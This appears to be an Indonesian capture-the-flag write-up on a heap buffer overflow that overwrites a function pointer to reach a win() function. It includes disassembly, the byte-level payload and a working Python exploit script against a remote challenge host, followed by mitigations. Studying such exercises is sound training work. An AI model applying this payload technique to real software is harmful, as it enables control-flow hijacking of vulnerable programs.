## Problem Statement & Scope
Diberikan berkas biner ELF 64-bit non-PIE (`chall`) beserta kode sumber C (`chall.c`). Program mengalokasikan dua blok data di memori heap: `input_data` dan pointer `x`. Pada modul ini, fungsi `check_win()` tidak lagi membandingkan string dengan `strcmp`, melainkan melakukan dereferensi terhadap konten blok heap `x` sebagai penunjuk fungsi (*function pointer*) dan memanggilnya:
```c
void check_win() { ((void (*)())*(int*)x)(); }
```
Terdapat fungsi target `win()` di dalam biner yang membuka berkas `flag.txt` dan mencetak isinya ke standar output. Peserta ditugaskan untuk membajak alur kontrol eksekusi (*control flow hijacking*) dengan memanfaatkan luapan buffer pada heap.

Program menyediakan antarmuka menu berbasis terminal:
1. **Print Heap:** Menampilkan alamat dan nilai aktif pada memori heap.
2. **Write to buffer:** Membaca input pengguna ke dalam chunk `input_data`.
3. **Print x:** Mencetak nilai pointer fungsi yang tersimpan di `x`.
4. **Print Flag:** Mengeksekusi penunjuk fungsi melalui `check_win()`.
5. **Exit:** Menghentikan program.

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Eksekusi Penunjuk Fungsi Tak Tervalidasi (CWE-822):**
   Fungsi `check_win()` memperlakukan isi memori pada alamat `x` sebagai fungsi eksekusi:
   ```c
   ((void (*)())*(int*)x)();
   ```
   Secara spesifik, kode mengkonversi pointer `x` ke `int*` (integer 32-bit), membaca 4 byte nilai integer di alamat tersebut, lalu mengonversinya menjadi pointer fungsi `void (*)()` dan mengeksekusinya.

2. **Analisis Disassembly Biner (x86-64 non-PIE):**
   Pemeriksaan biner menggunakan `objdump -d chall`:
   ```asm
   00000000004011f0 <check_win>:
     4011f0:  mov  0x2e69(%rip),%rax   # rax = x
     4011f7:  movslq (%rax),%rcx        # sign-extended 32-bit int at *rax -> rcx
     4011fa:  xor  %eax,%eax
     4011fc:  jmp  *%rcx               # lompat ke alamat di rcx
   ```
   Instruksi `jmp *%rcx` mentransfer kendali eksekusi proses ke nilai 64-bit yang dihasilkan dari sign-extension 32-bit integer di `*x`.
   Alamat fungsi target `win()` terletak statis pada:
   ```text
   0x004011a0 <win>
   ```
   Karena biner dikompilasi tanpa *Position Independent Executable* (non-PIE), basis alamat `0x004011a0` bersifat tetap dan deterministik di setiap eksekusi.

3. **Interaksi Format String `scanf("%s")` dan Little-Endian Encoding:**
   Fungsi `write_buffer()` menggunakan `scanf("%s", input_data)` yang tidak membatasi ukuran input pengguna (CWE-122). Jarak offset antara chunk `input_data` dan chunk `x` adalah tepat 32 byte (0x20).
   Untuk menuliskan nilai `0x004011a0` ke `*x`:
   - Representasi little-endian dari `0x004011a0` adalah 4 byte: `\xa0\x11\x40\x00`.
   - Fungsi `scanf("%s")` berhenti pada whitespace dan secara otomatis menambahkan byte terminasi null (`\x00`) pada akhir input yang ditulis.
   - Dengan mengirimkan 3 byte `\xa0\x11\x40` tepat setelah 32 byte padding, `scanf` menuliskan `\xa0 \x11 \x40` dan menambahkan byte ke-4 berupa `\x00`.
   - Hasil di memori `*x` menjadi `\xa0\x11\x40\x00`, yang dibaca oleh `movslq` sebagai `0x004011a0`.

## Metodologi Pengujian NIST SP 800-115
Mengikuti standar teknis NIST SP 800-115 (*Technical Guide to Information Security Testing and Assessment*):

1. **Fase Perencanaan & Penemuan (Planning & Discovery):**
   - Menjalankan analisis biner statis (`objdump -t`, `readelf -l`, `checksec`).
   - Menemukan ketiadaan proteksi PIE (*No PIE*) dan relokasi biner statis pada virtual memory base `0x400000`.
   - Mengidentifikasi alamat statis fungsi `win()` pada `0x004011a0`.
2. **Fase Analisis Kerentanan (Vulnerability Analysis):**
   - Menelaah mekanisme alih kendali di `check_win()` (`jmp *%rcx`).
   - Mengonfirmasi heap buffer overflow tak berbatas pada `scanf("%s", input_data)`.
   - Menentukan jarak offset linier 32 byte menuju buffer fungsi `x`.
3. **Fase Eksploitasi & Verifikasi (Attack Execution & Verification):**
   - Mengkonstruksi payload binary stream: 32 byte filler + little-endian tri-byte `\xa0\x11\x40`.
   - Memanfaatkan *implicit null termination* oleh `scanf` untuk menyempurnakan 4-byte pointer.
   - Memanggil `check_win()`, memverifikasi alur instruksi melompat ke `win()` dan mengembalikan flag kompetisi.
4. **Fase Remediasi & Mitigasi (Remediation):**
   - Rekomendasi penerapan PIE, ASLR, CFI, serta sanitasi ukuran buffer masukan.

import socket
import re
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(("chatelaine.cylabacademy.net", 34850))
time.sleep(0.3)
s.recv(4096)

# Menu 2: Tulis ke buffer input_data
s.sendall(b"2\n")
time.sleep(0.3)
s.recv(4096)

# 32 byte padding + alamat little-endian win() (0x004011a0)
# scanf("%s") otomatis menambahkan null byte terminasi (\x00)
payload = b"A" * 32 + b"\xa0\x11\x40\n"
s.sendall(payload)
time.sleep(0.3)
s.recv(4096)

# Menu 4: Panggil check_win() -> jmp *%rcx ke win()
s.sendall(b"4\n")

out = s.recv(4096).decode("utf-8", errors="ignore")
s.close()

flag = re.search(r"(?:academy|picoCTF)\{[^}]+\}", out).group(0)

## Takeaway Kompetensi LKS & Mitigasi Defensif
1. **Bahaya Pemanggilan Function Pointer Dinamis di Heap (CWE-822):**
   Menyimpan pointer fungsi atau objek yang memuat vtable di heap bersamaan dengan buffer pengguna rentan terhadap eksploitasi jika ada out-of-bounds write. Modul ini mengajarkan peserta LKS teknik pembajakan alur kontrol (*Control Flow Hijacking*) berbasis heap.
2. **Mitigasi Proteksi Biner Modern (NIST SP 800-115 / Hardening):**
   - **PIE (Position Independent Executable):** Aktifkan PIE (`gcc -fPIE -pie`) sehingga alamat fungsi diacak oleh ASLR pada setiap proses dan penyerang tidak dapat melompat ke alamat statis `0x4011a0`.
   - **CFI (Control Flow Integrity):** Terapkan Clang/GCC CFI (`-fsanitize=cfi`) atau Intel CET (*Control-flow Enforcement Technology*) untuk memvalidasi bahwa target lompatan fungsi tidak dimanipulasi secara ilegal.
3. **Pembersihan dan Pembatasan Buffer Input:**
   Ganti pembacaan tidak aman `scanf("%s")` dengan fungsi terikat panjang buffer seperti `fgets()` atau `read()`.
